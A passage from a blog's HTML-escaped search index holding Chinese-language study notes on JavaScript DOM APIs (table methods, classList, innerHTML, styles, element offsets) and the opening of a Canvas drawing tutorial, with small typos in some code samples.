</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">#### 4.2 操作表格</span></span><br><span class="line"><span class="string">createTHead() / deleteTHead()  : 创建/删除`</span>&lt;thead&gt;<span class="string">`元素</span></span><br><span class="line"><span class="string">createTFoot() / deleteTFoot()  : 创建/删除`</span>&lt;tfoot&gt;<span class="string">`元素</span></span><br><span class="line"><span class="string">createCaption() / deleteTFoot(): 创建/删除`</span>&lt;caption&gt;<span class="string">`元素</span></span><br><span class="line"><span class="string">*rows*</span></span><br><span class="line"><span class="string">保存着`</span>&lt;tbody&gt;<span class="string">`元素中行的HTMLCollection。你可以用`</span>deleteRow(pos)<span class="string">`删除行，`</span>insertRow(pos)<span class="string">`插入行</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">*cells*</span></span><br><span class="line"><span class="string">保存着`</span>&lt;tr&gt;<span class="string">`元素中单元格的HTMLCollection。你可以用`</span>deleteCell(pos)<span class="string">`删除指定位置单元格，`</span>insertCell(post)<span class="string">`向cells指定位置插入一个单元格</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">`</span><span class="string">``</span>js</span><br><span class="line"><span class="keyword">var</span> table = <span class="built_in">document</span>.createElement(<span class="string">'table'</span>);</span><br><span class="line"><span class="keyword">var</span> tbody = <span class="built_in">document</span>.createElement(<span class="string">'tbody'</span>);</span><br><span class="line">table.appendChild(tbody);</span><br><span class="line"></span><br><span class="line">tbody.insertRow(<span class="number">0</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].insertCell(<span class="number">0</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].cells[<span class="number">0</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"123"</span>));</span><br><span class="line">tbody.rows[<span class="number">0</span>].insertCell(<span class="number">1</span>);</span><br><span class="line">tbody.rows[<span class="number">0</span>].cells[<span class="number">1</span>].appendChild(<span class="built_in">document</span>.createTextNode(<span class="string">"456"</span>))</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="4-3-减少DOM操作"><a href="#4-3-减少DOM操作" class="headerlink" title="4.3 减少DOM操作"></a>4.3 减少DOM操作</h4><p><code>NodeList, NamedNodeMap 和 HTMLCollection</code>这三个集合都是动态的。当文档结构发生变化时，它们都会得到更新。从本质上，所有NodeList对象都是在访问DOM文档时实时运行的查询。</p><p>下列代码会导致无限循环。每次循环对条件<code>i &lt; divs.length</code>求值，意味着会运行取得所有<code>&lt;div&gt;</code>元素的查询。DOM操作往往是JS程序中开销最大的部分，<em>访问NodeList导致的问题最多</em>。NodeList是“动态的”，每次访问NodeList对象，都会运行一次查询，有鉴于此，最好就是尽量减少DOM操作。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> divs = <span class="built_in">document</span>.getElementsByTagName(<span class="string">"div"</span>);</span><br><span class="line"><span class="keyword">for</span> ( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; divs.length; i++ )&#123;</span><br><span class="line">  div = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">  <span class="built_in">document</span>.body.appendChld(div);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h3 id="5-HTML5"><a href="#5-HTML5" class="headerlink" title="5. HTML5"></a>5. HTML5</h3><h4 id="5-1-class"><a href="#5-1-class" class="headerlink" title="5.1 class"></a>5.1 class</h4><ul><li><p>document.getElementsByClassName</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.getElementsByClassName(<span class="string">"username current"</span>)</span><br><span class="line"><span class="built_in">document</span>.getElementById(<span class="string">"myDiv"</span>).getElementsByClassName(<span class="string">"selected"</span>)</span><br></pre></td></tr></table></figure></li><li><p>classList<br>className是一个字符串，HTML5新增了操作类名的方法，通过classList添加、删除和替换类名</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">div.classList.remove(<span class="string">"disabled"</span>)</span><br><span class="line">div.classList.add(<span class="string">"current"</span>)</span><br><span class="line">div.classList.contains(<span class="string">"bd"</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 列表存在已经给定的值，删除它；列表中没有给定的值，添加它</span></span><br><span class="line">div.classList.toggle(<span class="string">"user"</span>)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><h4 id="5-2-focus"><a href="#5-2-focus" class="headerlink" title="5.2 focus()"></a>5.2 focus()</h4><p><code>document.activeElement</code>始终会引用DOM中当前获得焦点的元素。默认情况下，文档刚刚加载完时，document.activeElement保存的是document.body元素<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> button = <span class="built_in">document</span>.getElementById(<span class="string">"myButton"</span>);</span><br><span class="line">button.focus()</span><br><span class="line"><span class="built_in">console</span>.log(<span class="built_in">document</span>.activeElement === button)  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">console</span>.log(docuemnt.hasFocus())                <span class="comment">// true</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="5-3-其他"><a href="#5-3-其他" class="headerlink" title="5.3 其他"></a>5.3 其他</h4><ul><li>document.readyState<br>document.readyState === “loading” 正在加载文档<br>document.readyState === “complete” 已经加载完文档</li></ul><p><br></p><ul><li>data-<br>为元素提供与渲染无无关的信息，要添加前缀data-<br><code>&lt;div class=&quot;myDiv&quot; data-appID=&quot;12345&quot; data-myname=&quot;Nicholas&quot;&gt;&lt;div&gt;</code><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">"myDiv"</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 获取值</span></span><br><span class="line"><span class="keyword">var</span> appId = div.dataset.appId;</span><br><span class="line"><span class="comment">// 设置值</span></span><br><span class="line">div.dataset.appId = <span class="string">"23456"</span>;</span><br><span class="line"><span class="comment">// 判断有无值</span></span><br><span class="line"><span class="keyword">if</span> (div.dataset.myname)&#123;&#125;</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>contains()<br>检查某个节点是不是另一个节点的后代。 <code>compareDocumentPosition()</code>也能确定节点间的关系，支持IE9+。返回1-无关， 2-位于参考节点前， 4- 位于参考节点后， 8-包含， 16-被包含。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.documentElement.contains(<span class="built_in">document</span>.body)  <span class="comment">// true</span></span><br><span class="line"><span class="built_in">document</span>.documentElement.compareDocumentPosition(<span class="built_in">document</span>.body)</span><br></pre></td></tr></table></figure></li></ul><p><br></p><ul><li>插入标记</li></ul><ol><li><p>innerHTML<br>直接插入HTML字符串。通过innerHTML插入script元素并不会执行其中的脚本，但是支持通过innerHTML插入style元素。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.innerHTML = <span class="string">"hello &amp; welcome, &lt;p&gt;reader!&lt;/p&gt;"</span></span><br><span class="line"><span class="built_in">console</span>.log(div.innerHTML)</span><br></pre></td></tr></table></figure></li><li><p>outerHTML<br>返回调用它的元素及所有子节点的HTML标签</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">div.outerHTML = <span class="string">"hello &amp; welcome, &lt;p&gt;reader!&lt;/p&gt;"</span></span><br><span class="line"><span class="built_in">console</span>.log(div.outerHTML)</span><br></pre></td></tr></table></figure></li><li><p>insertAdjacentHTML<br>接受两个参数：插入位置和要插入的HTML文本。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 作为前一个同辈元素插入</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'beforebegin'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为后一个同辈元素插入</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'afterend'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 作为第一个子元素插入</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'afterbegin'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">// 最为最后一个子元素插入</span></span><br><span class="line">element.insertAdjacentHTML(<span class="string">'beforeend'</span>, <span class="string">'&lt;p&gt;hello&lt;/p&gt;'</span>)</span><br></pre></td></tr></table></figure></li></ol><p>在使用innerHTML, outerHTML, insertAdjacentHTML()方法时，最好先手工删除药别替换的元素的所有事件程序和js对象属性。设置innerHTML或outerHTML时，就会创建一个HTML解析器。不可避免地，创建和销毁HTML解析器会带来性能损失。所以在插入大量新HTML标记时，可以先通过多次DOM操作再指定它们之间的关系。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> itemsHtml = <span class="string">""</span>;</span><br><span class="line"><span class="keyword">for</span>( <span class="keyword">var</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)&#123;</span><br><span class="line">  itemsHtml += <span class="string">"&lt;li&gt;"</span> + i + <span class="string">"&lt;/li&gt;"</span></span><br><span class="line">&#125;</span><br><span class="line">ul.innerHTML = itesHTML;</span><br></pre></td></tr></table></figure></p><p><br></p><ul><li>插入文本<br>innerText和outeText不是HTML5的属性。但IE4, safari, opera, chrome支持innerText, firefox虽然不支持，但支持作用类似的textContent。</li></ul><p><br></p><ul><li>滚动<br>scrollIntoView()<br>通过滚动浏览器窗口或某个容器元素，调用元素可以出现在视口中。<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.form[<span class="number">0</span>].scrollIntoView()</span><br></pre></td></tr></table></figure></li></ul><p><br><br><br></p><h3 id="6-2-DOM2和DOM3"><a href="#6-2-DOM2和DOM3" class="headerlink" title="6.2 DOM2和DOM3"></a>6.2 DOM2和DOM3</h3><h4 id="6-1-style"><a href="#6-1-style" class="headerlink" title="6.1 style"></a>6.1 style</h4><p>行内style对象，包含着通过HTML的style特性指定的所有样式信息，但不包含与外部样式表或嵌入样式表层叠而来的样式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> div = <span class="built_in">document</span>.getElementById(<span class="string">"id"</span>);</span><br><span class="line">div.style.backgroundColor = <span class="string">"red"</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 访问style特性中的CSS代码</span></span><br><span class="line">div.style.cssText = <span class="string">"width: 25px; height: 100px; background-color: green"</span>;</span><br><span class="line">div.style.length</span><br><span class="line">div.style.getPropertyValue(propertyName)</span><br><span class="line">div.style.setProperty(propertyName, value, priority)</span><br><span class="line">div.style.removeProperty(propertyName)</span><br><span class="line">div.style.item(index)  <span class="comment">// 返回给定位置的CSS属性的名称</span></span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-2-getComputedStyle"><a href="#6-2-getComputedStyle" class="headerlink" title="6.2 getComputedStyle"></a>6.2 getComputedStyle</h4><p>getComputedStyle()方法接受两个参数：要计算样式的元素和一个伪元素字符串(:after, 可以是null)。返回一个CSSStyleDeclaration对象，其中包含当前元素的所有计算的样式。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> myDiv = <span class="built_in">document</span>.getElementById(<span class="string">'myDiv'</span>);</span><br><span class="line"><span class="keyword">var</span> computedStyle = <span class="built_in">document</span>.defaultView.getComputedStyle(myDiv, <span class="literal">null</span>); </span><br><span class="line"></span><br><span class="line"><span class="comment">// IE不支持getComputedStyle，但有类似的方法myDiv.currentStyle</span></span><br><span class="line"><span class="comment">// var computedStyle = myDiv.currentStyle;</span></span><br><span class="line">computedStyle.width;</span><br><span class="line">computedStyle.height;</span><br><span class="line">computedStyle.backgroundColor;</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-3-CSSStylesSheet"><a href="#6-3-CSSStylesSheet" class="headerlink" title="6.3 CSSStylesSheet"></a>6.3 CSSStylesSheet</h4><p>向现有样式表中添加新规则<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">insertRule</span>(<span class="params">sheet, selectorText, cssText, position</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (sheet.insertRule)&#123;</span><br><span class="line">    sheet.insertRule(selectorText + <span class="string">"&#123;"</span> + cssText + <span class="string">"&#125;"</span>, position);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sheet.addRule)&#123;</span><br><span class="line">    sheet.addRule(selectorText, cssText, position);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">insertRule(<span class="built_in">document</span>.styleSheets[<span class="number">0</span>], <span class="string">"body"</span>, <span class="string">"background-color: silver"</span>, <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p>向现在样式表删除规则<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">deleteRule</span>(<span class="params">sheet, index</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (sheet.deleteRule)&#123;</span><br><span class="line">    sheet.deleteRule(index);</span><br><span class="line">  &#125; <span class="keyword">else</span> <span class="keyword">if</span> (sheet.removeRule)&#123;</span><br><span class="line">    sheet.removeRule(index);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">deleteRule(<span class="built_in">document</span>.styleSheets[<span class="number">0</span>], <span class="number">0</span>);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-4-offsetHeight-clientHeight-scrollHeight"><a href="#6-4-offsetHeight-clientHeight-scrollHeight" class="headerlink" title="6.4 offsetHeight, clientHeight, scrollHeight"></a>6.4 offsetHeight, clientHeight, scrollHeight</h4><p><em>offsetHeight</em><br>通过下列4个属性获取元素的偏移量: offsetHeight, offsetWidth, offsetLeft, offsetTop。要想知道某个元素在页面上的偏移量，将这个元素的offsetLeft和offsetTop与其offsetParent的相同属性相加，如此循环直至根元素，就可以得到一个基本准确的值。<br><img src="/2018/10/07/DOM/3.png" style="max-width:350px; margin-top:20px"></p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getElementTop</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">var</span> actuaTop = element.offsetTop;</span><br><span class="line">  <span class="keyword">var</span> current = element.offsetParent;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span>( current !== <span class="literal">null</span> )&#123;</span><br><span class="line">    actualTop += current.offsetTop;</span><br><span class="line">    current = current.offsetParent;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="keyword">return</span> actualLeft;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><br><br><em>clientHeight</em><br>元素内容及其内边距所占据的空间大小: clientWidth 和 clientHeight。最常用到的是，确定浏览器视口大小，可以使用document.documentElement 或 document.body 的 clientWidth 和 clientHeight。<br><img src="/2018/10/07/DOM/4.png" style="max-width:350px; margin-top:20px"><br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">document</span>.body.clientWidth || <span class="built_in">document</span>.documentElement.clientWidth</span><br></pre></td></tr></table></figure></p><p><br><br><em>scrollHeight</em><br>scrollHeight: 元素内容的总高度<br>scrollWidth: 元素内容的总宽度<br>scrollLeft: 被隐藏在内容区域左侧的像素数，设置这个属性可以改变元素的滚动位置<br>scrollTop: 被隐藏在内容区域上方的像素数， 设置这个属性可以改变元素的滚动位置<br><img src="/2018/10/07/DOM/5.png" style="max-width:350px; margin-top: 20px"></p><p>在确定文档的总高度时，必须取得 scrollWidth/clientWidth 和 scrollHeight/clientHeight 中的最大值。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 文档总高度</span></span><br><span class="line"><span class="keyword">var</span> docHeight = <span class="built_in">Math</span>.max(<span class="built_in">document</span>.documentElement.scrollHeight, <span class="built_in">document</span>.documentElement.clientHeight);</span><br></pre></td></tr></table></figure></p><p><br></p><h4 id="6-5-getBoundingClientRect"><a href="#6-5-getBoundingClientRect" class="headerlink" title="6.5 getBoundingClientRect"></a>6.5 getBoundingClientRect</h4><p>给出了元素在页面中相对视口的位置，包含4个属性: left, top, right, bottom。<code>-scrollTop</code>是为了防止调用这个函数时窗口被滚动了。</p><p>如果不支持<code>getBoundingClientRect()</code>方法，就使用<code>offsetHeight</code>一层层计算。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getBoundingClientRect</span>(<span class="params">element</span>)</span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (<span class="keyword">typeof</span> <span class="built_in">arguments</span>.callee.offset != <span class="string">"number"</span>)&#123;</span><br><span class="line">    <span class="keyword">var</span> scrollTop = <span class="built_in">document</span>.documentElement.scrollTop;</span><br><span class="line">    <span class="keyword">var</span> temp = <span class="built_in">document</span>.createElement(<span class="string">"div"</span>);</span><br><span class="line">    temp.style.cssText = <span class="string">"position:absolute;left:0;top:0;"</span>; <span class="built_in">document</span>.body.appendChild(temp);</span><br><span class="line">    <span class="built_in">arguments</span>.callee.offset = -temp.getBoundingClientRect().top - scrollTop; <span class="built_in">document</span>.body.removeChild(temp);</span><br><span class="line">    temp = <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">var</span> rect = element.getBoundingClientRect();</span><br><span class="line">  <span class="keyword">var</span> offset = <span class="built_in">arguments</span>.callee.offset;</span><br><span class="line">  <span class="keyword">return</span> &#123;</span><br><span class="line">      left: rect.left + offset,</span><br><span class="line">      right: rect.right + offset,</span><br><span class="line">      top: rect.top + offset,</span><br><span class="line">      bottom: rect.bottom + offset</span><br><span class="line">  &#125;; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p><br></p>]]></content>
      
      <categories>
          
          <category> Browser </category>
          
      </categories>
      
      
    </entry>
    
    <entry>
      <title>Canvas实现白板功能</title>
      <link href="/2018/10/06/Canvas%E6%96%87%E6%A1%A3/"/>
      <url>/2018/10/06/Canvas%E6%96%87%E6%A1%A3/</url>
      <content type="html"><![CDATA[<h3 id="1-元素"><a href="#1-元素" class="headerlink" title="1. 元素"></a>1. 元素</h3><ul><li><p>canvas元素<br>canvas是一个可以使用JS来绘制图形的HTML元素。canvas标签只有两个属性——width和height。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;canvas id=<span class="string">"tutorial"</span> width=<span class="string">"150"</span> height=<span class="string">"150"</span>&gt;<span class="xml"><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span></span><br></pre></td></tr></table></figure></li><li><p>渲染上下文<br>canvas元素创造了一个固定大小的画布，它公开了一个或多个渲染上下文，用来绘制和处理要展示的内容。</p><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">'tutorial'</span>);</span><br><span class="line"><span class="keyword">var</span> ctx    = canvas.getContext(<span class="string">'2d'</span>);</span><br></pre></td></tr></table></figure></li><li><p>坐标<br>画布的起点为左上角(坐标(0, 0))，所有元素的位置都相对于原点定位。<br><img src="/2018/10/06/Canvas文档/1.png" style="padding-top:20px; max-width: 380px"><br><br></p></li></ul><h3 id="2-绘制"><a href="#2-绘制" class="headerlink" title="2. 绘制"></a>2. 绘制</h3><h4 id="2-1-矩形"><a href="#2-1-矩形" class="headerlink" title="2.1 矩形"></a>2.1 矩形</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ctx.fillRect(x, y, width, height)     绘制一个填充的矩形</span><br><span class="line">ctx.strokeRect(x, y, width, height)   绘制一个矩形的边框</span><br><span class="line">ctx.clearRect(x, y, width, height)    清除指定矩形区域，让清除部分完全透明</span><br></pre></td></tr></table></figure><h4 id="2-2-圆弧"><a href="#2-2-圆弧" class="headerlink" title="2.2 圆弧"></a>2.2 圆弧</h4><p>画一个以(x,y)为圆心的radius为半径的圆，从startAngle开始到endAngle结束，按照anticlockwise给定的方向(默认顺时针)生成。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.arc(x, y, radius, startAngle, endAngle, anticlockwise)</span><br></pre></td></tr></table></figure></p><p>根据给定的控制点和半径画一段圆弧，再以直线连接两个控制点。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ctx.acrTo(x1, y1, x2, y2, radius)</span><br></pre></td></tr></table></figure></p><h4 id="2-3-路径"><a href="#2-3-路径" class="headerlink" title="2.3 路径"></a>2.3 路径</h4><p>路径是通过不同颜色和宽度的线段/曲线相连形成的不同形状的店的集合。绘制图形的步骤：①创建路径起点；②使用画图命令画出路径；③封闭路径；④通过描边或填充路径来渲染图形。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">ctx.beginPath()   新建路径</span><br><span class="line">ctx.moveTo(x,y)   将笔触移动到(x,y)上</span><br><span class="line">ctx.lineTo(x,y)   绘制一条从当前位置到(x,y)的直线</span><br><span class="line">ctx.closePath()   闭合路径</span><br><span class="line">ctx.stroke()      绘制路径</span><br><span class="line">ctx.fill()        填充路径</span><br></pre></td></tr></table></figure></p><h4 id="2-4-贝塞尔曲线"><a href="#2-4-贝塞尔曲线" class="headerlink" title="2.4 贝塞尔曲线"></a>2.4 贝塞尔曲线</h4><p>二次贝塞尔曲线, cplx,cply为一个控制点, x,y为结束点<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">quadraticCurveTo(cplx, cply, x, y)</span><br></pre></td></tr></table></figure></p><p>三次贝塞尔曲线, cplx,cply为控制点1, cp2x,cp2y为控制点2, x,y为结束点<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">bezierCurveTo(cplx, cply, cp2x, cp2y, x, y)</span><br></pre></td></tr></table></figure></p><p><img src="/2018/10/06/Canvas文档/2.png" style="padding-top:20px; max-width: 380px"><br><br></p><h3 id="3-使用样式和颜色"><a href="#3-使用样式和颜色" class="headerlink" title="3. 使用样式和颜色"></a>3. 使用样式和颜色</h3><h4 id="3-1-描边，填充"><a href="#3-1-描边，填充" class="headerlink" title="3.1 描边，填充"></a>3.1 描边，填充</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">ctx.fillStyle = color               设置图形的填充颜色</span><br><span class="line">ctx.strokeStyle = color             设置图形轮廓的颜色</span><br><span class="line">ctx.globalAlpha = transparencyValue 设置canvas里所有图形的透明度</span><br><span class="line"></span><br><span class="line"><span class="comment">// 线型</span></span><br><span class="line">lineWidth = <span class="number">1</span>                       设置线条宽度      </span><br><span class="line">lineCap = <span class="string">'butt/round/square'</span>       设置线条末端样式</span><br><span class="line">lineJoin = <span class="string">'round/bevel/miter'</span>      设定线条与线条间接合处的样式</span><br><span class="line">miterLimit = <span class="number">1</span>                      限制两条线相交时交接处最大长度</span><br><span class="line">getLineDash()                       返回当前虚线样式</span><br><span class="line">setLineDash([<span class="number">4</span>, <span class="number">2</span>])                 设置当前虚线样式，接受一个数组来指定线段与间隙的交替</span><br><span class="line">lineDashOffset = value              设置虚线样式的起始偏移量</span><br></pre></td></tr></table></figure><h4 id="3-2-渐变"><a href="#3-2-渐变" class="headerlink" title="3.2 渐变"></a>3.2 渐变</h4><p>我们可以用线性或径向的渐变来填充或描边。新建一个<code>canvasGradient</code>对象，并且赋给<code>fillStyle或strokeStyle</code>属性。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建canvasGradient对象</span></span><br><span class="line"><span class="keyword">var</span> lineargradient = ctx.createLinearGradient(x1, y1, x2, y2);</span><br><span class="line"><span class="keyword">var</span> radialgradient = ctx.createRadialGradient(x1, y1, r1, x2, y2, r2);</span><br><span class="line"></span><br><span class="line"><span class="comment">// 添加任意多个色标</span></span><br><span class="line">lineargradient.addColorStop(<span class="number">0</span>, <span class="string">'#000'</span>);</span><br><span class="line">lineargradient.addColorStop(<span class="number">1</span>, <span class="string">'#fff'</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// assign gradients to fill and stroke styles</span></span><br><span class="line">ctx.fillStyle = lineargradient;</span><br><span class="line">ctx.strokeStyle = lineargradient;</span><br><span class="line"></span><br><span class="line"><span class="comment">// draw shapes</span></span><br></pre></td></tr></table></figure></p><h4 id="3-3-图案样式"><a href="#3-3-图案样式" class="headerlink" title="3.3 图案样式"></a>3.3 图案样式</h4><p>图案的应用和渐变很像，创建出一个pattern后，赋给<code>fillStyle或strokeStyle</code>属性即可。<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</span><br><span class="line">img.src = <span class="string">'someimage.png'</span>;</span><br><span class="line"><span class="keyword">var</span> ptrn = ctx.createPattern(img, type)</span><br><span class="line"><span class="comment">// type可选repeat, repeat-x, repeat-y, no-repeat</span></span><br></pre></td></tr></table></figure></p><h4 id="3-4-阴影"><a href="#3-4-阴影" class="headerlink" title="3.4 阴影"></a>3.4 阴影</h4><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ctx.shadowOffsetX = float   设定阴影在X轴的延伸距离</span><br><span class="line">ctx.shadowOffsetY = float   设定阴影在Y轴的延伸距离</span><br><span 